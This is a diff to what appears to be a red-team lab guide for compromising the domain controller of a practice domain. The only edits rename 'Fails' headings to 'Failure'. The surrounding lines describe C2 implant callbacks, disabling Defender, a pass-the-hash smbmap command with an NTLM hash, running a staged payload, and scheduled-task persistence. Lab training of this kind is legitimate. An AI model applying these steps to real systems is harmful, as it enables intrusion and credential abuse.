@@ -80,7 +80,7 @@ From here the guide addresses the DC as `dc01`. If a later `dc01` command fails 
 
 **Success:** nmap returns DC01's services (SMB 445, Kerberos 88, LDAP 389/636, WinRM 5985, RDP 3389, and the AD CS web endpoint among them), and `smb-os-discovery` plus `rdp-ntlm-info` report the computer name, domain, and OS build (`DC01` / `shadow.gate`, Server 2022 `10.0.20348`). That confirms the tunnel is carrying operator traffic and gives you the name used in the hosts entry above.
 
-**Fails:** nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.
+**Failure:** nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.
 
 ---
 
@@ -187,7 +187,7 @@ ps
 
 **Success:** a new session from `<ShadowGate IP>` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
 
-**Fails:** watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H dc01 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
+**Failure:** watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H dc01 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
 
 ---
 
@@ -231,7 +231,7 @@ execute C:\\Windows\\Temp\\axUpdate.exe
 
 **Success:** Apollo registers in Mythic's Active Callbacks and the beacon in Adaptix's sessions view, both as `SHADOW\Administrator`. All three C2s now hold an Administrator beacon on the DC, staged entirely through the Sliver foothold, no SMB or pass-the-hash needed after the first beacon.
 
-**Fails:** if a beacon does not appear, Defender may have caught the less-obfuscated payload; re-run the Defender disable from Phase 3 and re-execute. Confirm the files uploaded with `ls C:/Windows/Temp/`.
+**Failure:** if a beacon does not appear, Defender may have caught the less-obfuscated payload; re-run the Defender disable from Phase 3 and re-execute. Confirm the files uploaded with `ls C:/Windows/Temp/`.
 
 ---
 
@@ -269,7 +269,7 @@ Clean up the task:
 execute -o schtasks.exe /delete /tn svcpub /f
 ```
 
-**Fails:** if the new session never appears, re-confirm the task path echoed with correct backslashes, and that Defender realtime is still off (re-run the disable from Phase 3 step 3).
+**Failure:** if the new session never appears, re-confirm the task path echoed with correct backslashes, and that Defender realtime is still off (re-run the disable from Phase 3 step 3).
 
 ---
 
